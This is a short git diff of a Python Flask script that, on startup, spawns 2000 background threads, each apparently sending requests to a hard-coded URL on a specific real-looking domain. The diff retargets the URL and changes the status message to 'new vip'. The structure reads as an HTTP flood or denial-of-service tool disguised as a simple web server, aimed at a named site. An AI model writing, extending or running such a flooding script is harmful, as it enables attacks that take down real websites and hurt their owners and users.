@@ -38,7 +38,7 @@ def chek(url):
             print("Request failed")
 
 def start_threads():
-    target_url = "https://omar.x10.mx/public"
+    target_url = "https://omar.x10.mx/omar/public/"
     for _ in range(2000):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
@@ -46,7 +46,7 @@ def start_threads():
 
 @app.route('/')
 def home():
-    return "Server is running with background threads!"
+    return "Server is running with background threads new vip!"
 
 if __name__ == '__main__':
     threading.Thread(target=start_threads, daemon=True).start()
